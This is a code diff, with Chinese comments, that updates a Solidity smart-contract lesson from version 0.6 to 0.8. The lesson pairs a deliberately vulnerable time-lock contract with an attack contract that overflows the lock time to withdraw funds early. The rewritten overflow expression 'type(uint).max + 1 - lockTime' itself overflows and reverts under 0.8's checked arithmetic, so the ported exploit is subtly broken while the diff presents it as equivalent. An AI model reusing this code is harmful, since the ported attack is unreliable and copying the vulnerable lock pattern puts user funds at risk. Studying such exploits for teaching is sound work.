@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: UNLICENSED
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
 import "@openzeppelin/contracts/utils/math/SafeMath.sol";
 
@@ -17,7 +17,9 @@ contract TimeLock {
 
     function deposit() public payable {
         balances[msg.sender] += msg.value;
-        lockTime[msg.sender] += now + 1 weeks;
+        // 0.6 语法 deprecated
+        // lockTime[msg.sender] += now + 1 weeks;
+        lockTime[msg.sender] += block.timestamp + 1 weeks;
     }
 
     function increaseLockTime(uint _secondsToIncrease) public {
@@ -29,7 +31,11 @@ contract TimeLock {
 
     function withdraw() public {
         require(balances[msg.sender] > 0, "Insufficient funds");
-        require(now > lockTime[msg.sender], "Lock time not expired");
+        // require(now > lockTime[msg.sender], "Lock time not expired");
+        require(
+            block.timestamp > lockTime[msg.sender],
+            "Lock time not expired"
+        );
 
         uint amount = balances[msg.sender];
         balances[msg.sender] = 0;
@@ -56,7 +62,9 @@ contract Attack {
         // x= -t
         timeLock.increaseLockTime(
             // 2**256 - 1
-            uint(-timeLock.lockTime(address(this)))
+            // 0.6 语法
+            // uint(-timeLock.lockTime(address(this)))
+            type(uint).max + 1 - timeLock.lockTime(address(this))
         );
         timeLock.withdraw();
     }
